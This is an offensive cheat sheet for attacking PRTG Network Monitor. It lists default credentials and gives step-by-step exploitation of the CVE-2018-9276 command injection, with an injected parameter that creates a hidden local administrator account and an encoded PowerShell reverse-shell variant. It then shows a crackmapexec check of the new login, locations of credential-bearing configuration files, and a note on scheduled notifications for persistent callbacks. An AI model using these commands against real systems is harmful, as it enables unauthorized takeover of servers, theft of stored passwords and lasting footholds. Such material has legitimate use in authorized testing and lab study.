# PRTG Network Monitor

## Discovery

- Default ports: 80, 443, 8080
- Nmap shows: `Indy httpd (Paessler PRTG bandwidth monitor)`
- Default creds: `prtgadmin:prtgadmin`

```bash
# Version check
curl -s http://TARGET:8080/index.htm -A "Mozilla/5.0" | grep prtgversion
```

---

## Command Injection (CVE-2018-9276)

**Affects:** PRTG < 18.2.39

### Exploit Steps

1. Login to PRTG admin panel
2. `Setup → Account Settings → Notifications`
3. Click `Add new notification`
4. Give it a name (e.g., "pwn")
5. Scroll down, check `EXECUTE PROGRAM`
6. Select: `Demo exe notification - outfile.ps1`
7. In Parameter field:

```
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```

8. Click `Save`
9. Click `Test` on the notification

### Alternative - Reverse Shell Parameter

```
test.txt;powershell -e JABjAGwAaQBlAG4AdAA9...BASE64_PAYLOAD
```

### Verify Access

```bash
crackmapexec smb TARGET -u prtgadm1 -p 'Pwn3d_by_PRTG!'
```

---

## Credential Locations

```
# Windows
C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.dat
C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.old.bak
```

Search for `<dbpassword>` in config files.

---

## Persistence

Can schedule notification to run at specific times for persistent callback.
